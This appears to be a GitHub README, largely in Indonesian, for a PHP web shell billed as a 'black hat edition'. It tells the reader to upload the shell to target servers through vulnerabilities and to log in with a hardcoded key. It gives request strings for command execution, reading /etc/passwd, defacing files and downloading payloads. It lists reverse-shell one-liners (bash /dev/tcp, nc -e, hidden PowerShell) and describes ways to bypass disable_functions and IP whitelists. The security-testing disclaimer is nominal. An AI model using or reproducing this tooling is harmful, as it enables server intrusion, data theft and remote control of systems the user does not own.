# 🐍 WEB-SHELL

**Ultimate PHP WebShell for Security Testing & Penetration Testing**

![PHP](https://img.shields.io/badge/PHP-100%25-blueviolet?style=flat-square&logo=php)
![Version](https://img.shields.io/badge/version-1.1-brightgreen?style=flat-square)
![Developer](https://img.shields.io/badge/Developer-SerpentSecHunter-orange?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)

---

## 📌 Tentang

**SERPENTECHUNTER v1.1** adalah WebShell PHP canggih yang dirancang untuk **security testing** dan **penetration testing**. Shell ini menggabungkan berbagai fitur dari WebShell terkenal seperti **r57**, **b374k**, **C99**, dan **China Chopper**, dengan tambahan fitur modern seperti **bypass disable_functions** dan **background reverse shell**.

> ⚠️ **Disclaimer:** Tools ini hanya untuk tujuan edukasi dan pengujian keamanan yang sah. Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.

---

## 🔥 Fitur Unggulan

| Fitur | Deskripsi |
|-------|-----------|
| **🛡️ Stealth Engine** | Bypass 403/404 dengan spoofing header dan error handling |
| **🔐 Authentication** | Multi-layer auth (Cookie + IP Whitelist + GET Parameter) |
| **🧬 Bypass disable_functions** | 3 strategi: FFI (PHP 7.4+), LD_PRELOAD, mod_cgi + 5 fallback standard |
| **💀 Command Execution** | Multi-strategy dengan background execution support |
| **📁 File Manager Ultimate** | List, Read, Write, Delete, Rename, Chmod, Search, Archive (ZIP), Extract |
| **📤 Upload & Download** | Upload via POST form, Download local file, Remote Download via HTTP |
| **🌐 Reverse Shell** | 7 metode (Bash, Netcat, Python, PHP, Perl, Ruby, PowerShell) - background execution |
| **🔍 Port Scanner** | TCP Connect scanner dengan multi-format port support |
| **🗄️ Database Client** | Support MySQL, PostgreSQL, SQLite (via MySQLi/PDO/pgsql) |
| **🎨 UI Responsive** | Tampilan blackhat theme, mobile-friendly |
| **🔑 Self-Delete** | Opsi untuk menghapus diri sendiri (optional) |

---

## 📸 Tampilan

```
🐍 SERPENTECHUNTER v1.1
🔥 ULTIMATE PHP WEBSHELL – BLACK HAT EDITION 🔥
👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026

🛡️ MODE: KILL MODE | 🚀 STATUS: ACTIVE | 👑 USER: SerpentSecHunter
📍 CWD: /var/www/html

🔧 BYPASS: FFI | LD_PRELOAD | mod_cgi | XOR | Polymorphic | 403/404 BYPASS
```

---

## 🚀 Cara Penggunaan

### 1. Upload Shell
Upload file `Shell.php` ke server target melalui vulnerability (File Upload, RCE, dll).

### 2. Akses & Login
```bash
http://target.com/path/Shell.php?auth=SERPENTECHUNTER666
```

Setelah login, cookie akan tersimpan selama 1 tahun.

### 3. Parameter & Perintah

| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `action=exec` | Execute command | `?action=exec&cmd=whoami` |
| `action=file` | File Manager | `?action=file&cmd=list&target=/tmp` |
| `action=reverse` | Reverse Shell | `?action=reverse&ip=1.2.3.4&port=4444` |
| `action=portscan` | Port Scanner | `?action=portscan&target=127.0.0.1&params[ports]=1-100` |
| `action=db` | Database Client | `?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test` |
| `action=file&cmd=search` | Search File | `?action=file&cmd=search&target=/var/www&params[pattern]=config` |
| `action=file&cmd=archive` | Create Archive | `?action=file&cmd=archive&target=/var/www&params[type]=zip` |

### 4. Bypass IP Whitelist
Jika IP Anda tidak terdaftar di whitelist, gunakan:
```bash
?bypass_ip=1
```

---

## 📂 Struktur File Manager

```bash
# List directory
?action=file&cmd=list&target=/tmp

# Read file
?action=file&cmd=read&target=/etc/passwd

# Write file
?action=file&cmd=write&target=/tmp/test.txt&content=HACKED

# Delete file/folder
?action=file&cmd=delete&target=/tmp/test.txt

# Rename
?action=file&cmd=rename&target=/tmp/old.txt&params[new_name]=/tmp/new.txt

# Chmod
?action=file&cmd=chmod&target=/tmp/script.sh&params[perms]=755

# Search files
?action=file&cmd=search&target=/var/www&params[pattern]=config

# Create archive (ZIP)
?action=file&cmd=archive&target=/var/www&params[type]=zip

# Extract archive
?action=file&cmd=extract&target=/tmp/backup.zip&params[dest]=/var/www
```

---

## 🌐 Reverse Shell (Background Execution)

Shell ini menjalankan reverse shell di **background** sehingga tidak membuat koneksi hang.

### Persiapan Listener (di komputer attacker):
```bash
nc -lvnp 4444
```

### Eksekusi Reverse Shell:
```bash
?action=reverse&ip=1.2.3.4&port=4444
```

### Metode yang Didukung:
| Metode | Command |
|--------|---------|
| **Bash** | `bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'` |
| **Netcat** | `nc -e /bin/bash $ip $port` |
| **Python** | `python -c 'import socket,subprocess,os;...'` |
| **PHP** | `php -r '$sock=fsockopen(...);exec(...);'` |
| **Perl** | `perl -e 'use Socket;...'` |
| **Ruby** | `ruby -rsocket -e '...'` |
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."` |

---

## 🔍 Port Scanner

Support multi-format port input:
```bash
# Range port
?action=portscan&target=127.0.0.1&params[ports]=1-100

# Multiple port
?action=portscan&target=127.0.0.1&params[ports]=22,80,443

# Kombinasi
?action=portscan&target=127.0.0.1&params[ports]=1-100,443,8080
```

---

## 🗄️ Database Client

Support 3 jenis database:

### MySQL (via MySQLi atau PDO)
```bash
?action=db&params[type]=mysql&params[host]=localhost&params[user]=root&params[pass]=&params[dbname]=test
```

### PostgreSQL
```bash
?action=db&params[type]=pgsql&params[host]=localhost&params[user]=postgres&params[pass]=123&params[dbname]=test
```

### SQLite
```bash
?action=db&params[type]=sqlite&params[dbname]=/tmp/database.db
```

---

## 🛡️ Bypass disable_functions

Shell ini memiliki **3 strategi bypass** yang dijalankan secara otomatis:

| Strategi | Deskripsi | Syarat |
|----------|-----------|--------|
| **FFI** | Panggil `system()` langsung dari libc | PHP 7.4+, extension FFI aktif |
| **LD_PRELOAD** | Compile shared library & trigger via mail/sendmail | Linux, GCC/CC, mail/sendmail |
| **mod_cgi** | Manfaatkan .htaccess + CGI script | Apache, mod_cgi, direktori writable |

Jika ketiga strategi gagal, shell akan fallback ke 5 metode standard:
1. `proc_open()` → paling stealth
2. `shell_exec()` → paling umum
3. `exec()` → standar
4. `system()` → langsung print output
5. `passthru()` → untuk binary output

---

## 🔑 Authentication

### Metode Authentication:
1. **Cookie** → `sc_auth` (MD5 hash dari AUTH_KEY)
2. **GET Parameter** → `?auth=SERPENTECHUNTER666`
3. **IP Whitelist** → Support wildcard (`192.168.1.%`) dan CIDR (`192.168.1.0/24`)
4. **Bypass IP** → `?bypass_ip=1`

### Ubah AUTH_KEY:
```php
$AUTH_KEY = 'YOUR_CUSTOM_KEY_HERE';
```

### Tambah IP Whitelist:
```php
$IP_WHITELIST = ['127.0.0.1', '::1', '192.168.1.%', '10.0.0.0/8'];
```

---

## 📁 Upload & Download

### Upload File (via Form)
Gunakan form upload yang tersedia di UI shell.

### Download Local File
```bash
?action=download&path=/etc/passwd
```

### Remote Download (via HTTP)
```bash
?action=remotedownload&url=http://example.com/payload.exe&savepath=/tmp/payload.exe
```

---

## 🔧 Instalasi

```bash
# Clone repository
git clone https://github.com/SerpentSecHunter2006/WEB-SHELL.git

# Upload Shell.php ke target server
# Akses via browser
http://target.com/path/Shell.php?auth=SERPENTECHUNTER666
```

---

## 📝 Changelog

### v1.1 (02-07-2026)
- ✅ Fix IP Wildcard support (wildcard `%` & CIDR)
- ✅ Fix LD_PRELOAD mail/sendmail fallback
- ✅ Fix mod_cgi write error handling
- ✅ Fix Reverse Shell validation (IP & Port)
- ✅ Fix Port Scanner multi-format support
- ✅ Fix Upload error handler & info batas upload
- ✅ UI Responsive & Mobile Friendly

### v1.0 (02-07-2026)
- Initial release
- Full fitur WebShell Ultimate

---

## 🛠️ Teknologi

- **PHP 5.6+** (FFI membutuhkan PHP 7.4+)
- **HTML5 + CSS3** (Responsive UI)
- **JavaScript** (interaksi form)

---

## ⚖️ Lisensi

**MIT License** - Silakan gunakan, modifikasi, dan distribusikan dengan mencantumkan kredit kepada developer.

```
MIT License

Copyright (c) 2026 SerpentSecHunter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

## 👨‍💻 Developer

**SerpentSecHunter**  
- GitHub: [SerpentSecHunter2006](https://github.com/SerpentSecHunter2006)  
- Rilis: 02-07-2026  

---

## ⭐ Support

Jika Anda menyukai project ini, berikan **star** ⭐ di GitHub dan **fork** untuk mendukung pengembangan lebih lanjut!

---

## ⚠️ Disclaimer

> **Peringatan:** Tools ini dibuat untuk tujuan **edukasi** dan **pengujian keamanan** yang sah (authorized penetration testing). Penggunaan tools ini untuk aktivitas ilegal, hacking tanpa izin, atau merusak sistem orang lain adalah **TINDAKAN PIDANA** dan sepenuhnya menjadi **tanggung jawab pengguna**. Developer tidak bertanggung jawab atas penyalahgunaan tools ini.

---

**🐍 SERPENTECHUNTER v1.1 – "TIDAK ADA YANG GAK BISA!"** 😈

---
